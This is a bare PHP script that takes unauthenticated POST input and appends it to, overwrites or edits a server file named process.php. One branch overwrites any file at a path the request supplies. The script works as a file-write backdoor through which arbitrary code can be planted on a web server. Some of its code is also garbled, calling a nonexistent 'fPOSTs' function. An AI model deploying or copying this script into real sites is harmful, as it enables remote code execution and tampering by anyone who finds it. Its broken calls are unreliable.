<?php

if (!empty($_POST["TIP"])) {
	# code...
	switch ($_POST["TIP"]) {

	case '1':
			$content_file_url = "../../../system/process/process.php";
			$file=fopen($content_file_url,"a");
   			fwrite($file, $_POST["CON"]);     
    		fclose($file);
	break;
	case '2':
			$content_file_url = "../../../system/process/process.php";
			$content_ad = fopen($content_file_url,"r");
			while(!feof($content_ad))
			{
			$content_all = fPOSTs($content_ad, 255);
			}
			$content_all = $_POST["CON"];
			$file=fopen($content_file_url,"w");
   			fwrite($file, $content_all);     
    		fclose($file);


	break;

	case '3':
			$content_file_url = $_POST["PATH"];
			$content_ad = fopen($content_file_url,"r");
			while(!feof($content_ad))
			{
			$content_all = fPOSTs($content_ad, 255);
			}
			$content_all = $_POST["CON"];
			$file=fopen($content_file_url,"w");
   			fwrite($file, $content_all);     
    		fclose($file);

	break;

	case '4':
			$content_file_url = "../../../system/process/process.php";
			$content_ad = fopen($content_file_url,"r");
			while(!feof($content_ad))
			{
			$content_all = fPOSTs($content_ad, 255);
			}

			$content_all = str_replace($_POST["CON"], "", $content_all);
			$file=fopen($content_file_url,"w");
   			fwrite($file, $content_all);     
    		fclose($file);
			

	break;

	default:

	break;	
	}

}



?>